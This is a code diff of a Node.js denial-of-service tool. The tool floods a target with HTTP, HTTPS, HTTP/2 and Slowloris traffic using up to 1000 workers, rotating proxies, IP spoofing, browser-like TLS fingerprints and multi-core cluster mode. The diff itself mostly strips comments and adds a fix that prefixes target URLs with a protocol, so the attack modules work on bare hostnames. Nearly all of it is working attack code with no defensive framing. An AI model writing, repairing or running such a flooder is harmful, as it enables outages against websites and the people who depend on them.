@@ -36,14 +36,14 @@ let CONFIG = {
     target: null,
     duration: 60,
     workers: 1000,
-    rate: 0,                // requests/sec per worker (0 = unlimited)
+    rate: 0,
     proxyFile: null,
-    mode: 'mixed',          // 'http', 'https', 'http2', 'slowloris', 'mixed'
+    mode: 'mixed',
     timeout: 10000,
     ipSpoof: true,
     followRedirect: false,
     clusterMode: false,
-    ramLimit: 85,           // restart if RAM >85%
+    ramLimit: 85,
     restartDelay: 1000
 };
 
@@ -56,8 +56,6 @@ if (process.argv.length >= 3) {
     CONFIG.proxyFile = process.argv[6] || null;
     CONFIG.mode = process.argv[7] || 'mixed';
     if (process.argv.includes('--cluster')) CONFIG.clusterMode = true;
-} else {
-    // Interactive mode later
 }
 
 // ==================== PROXY MANAGER ====================
@@ -74,7 +72,6 @@ function loadProxies() {
             return l && !l.startsWith('#') && l.includes(':');
         });
         console.log(`${c.green}[✓] Loaded ${proxies.length} proxies${c.reset}`);
-        // Quick validation (async)
         validateProxies();
     } catch(e) {
         console.log(`${c.yellow}[!] No proxy file – running without proxies${c.reset}`);
@@ -82,7 +79,6 @@ function loadProxies() {
 }
 
 async function validateProxies() {
-    const testUrl = 'http://httpbin.org/ip';
     const valid = [];
     for (const proxy of proxies.slice(0, 50)) {
         try {
@@ -127,7 +123,6 @@ const TLS_CIPHERS = [
     'ECDHE-RSA-AES256-GCM-SHA384'
 ].join(':');
 
-// FIXED: removed secureProtocol to avoid conflict with minVersion/maxVersion
 const TLS_OPTIONS = {
     ciphers: TLS_CIPHERS,
     ecdhCurve: 'X25519',
@@ -226,10 +221,12 @@ function generateHeaders(host, isHttp2 = false) {
     return headers;
 }
 
-// ==================== ATTACK MODULES ====================
+// ==================== ATTACK MODULES (with URL fix) ====================
 
-// 1. HTTP/2 with TLS fingerprint (most powerful)
+// 1. HTTP/2
 function attackHttp2(targetUrl, callback) {
+    // Ensure URL has protocol
+    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
     const parsed = new URL(targetUrl);
     const proxy = getProxy();
     let socket;
@@ -282,8 +279,9 @@ function attackHttp2(targetUrl, callback) {
     }
 }
 
-// 2. HTTPS (fallback)
+// 2. HTTPS
 function attackHttps(targetUrl, callback) {
+    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
     const parsed = new URL(targetUrl);
     const path = generatePath();
     const headers = generateHeaders(parsed.hostname, false);
@@ -304,7 +302,6 @@ function attackHttps(targetUrl, callback) {
         options.agent = new https.Agent({ proxy: { host: proxyHost, port: parseInt(proxyPort) } });
     }
     const req = https.request(options, (res) => {
-        let data = '';
         res.on('data', () => {});
         res.on('end', () => {
             callback(res.statusCode >= 200 && res.statusCode < 400, res.statusCode, Date.now() - start);
@@ -318,12 +315,12 @@ function attackHttps(targetUrl, callback) {
     req.end();
 }
 
-// 3. Slowloris (keep connections open)
+// 3. Slowloris
 function slowloris(targetUrl, callback) {
+    if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
     const parsed = new URL(targetUrl);
     const headers = generateHeaders(parsed.hostname, false);
     headers['Connection'] = 'keep-alive';
-    // Send incomplete request headers slowly
     const options = {
         hostname: parsed.hostname,
         port: 443,
@@ -334,7 +331,6 @@ function slowloris(targetUrl, callback) {
     };
     const req = https.request(options);
     req.on('error', () => callback(false, null, 0));
-    // Keep socket open
     req.setTimeout(30000, () => {});
     req.write(`GET ${generatePath()} HTTP/1.1\r\n`);
     setTimeout(() => {
@@ -349,8 +345,9 @@ function slowloris(targetUrl, callback) {
     }, 1000);
 }
 
-// 4. HTTP (plain, for non-SSL)
+// 4. HTTP
 function attackHttp(targetUrl, callback) {
+    if (!targetUrl.startsWith('http')) targetUrl = 'http://' + targetUrl;
     const parsed = new URL(targetUrl);
     const path = generatePath();
     const headers = generateHeaders(parsed.hostname, false);
@@ -436,7 +433,7 @@ function displayStats() {
         `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
 }
 
-// ==================== RAM MONITOR (auto-restart) ====================
+// ==================== RAM MONITOR ====================
 function monitorRam() {
     const used = process.memoryUsage().rss / 1024 / 1024;
     const total = os.totalmem() / 1024 / 1024;
@@ -550,7 +547,7 @@ async function main() {
     }, duration * 1000);
 }
 
-// ==================== CLUSTER MODE (multi-core) ====================
+// ==================== CLUSTER MODE ====================
 if (cluster.isMaster && CONFIG.clusterMode) {
     const numCPUs = os.cpus().length;
     console.log(`${c.green}[✓] Master ${process.pid} starting ${numCPUs} workers${c.reset}`);
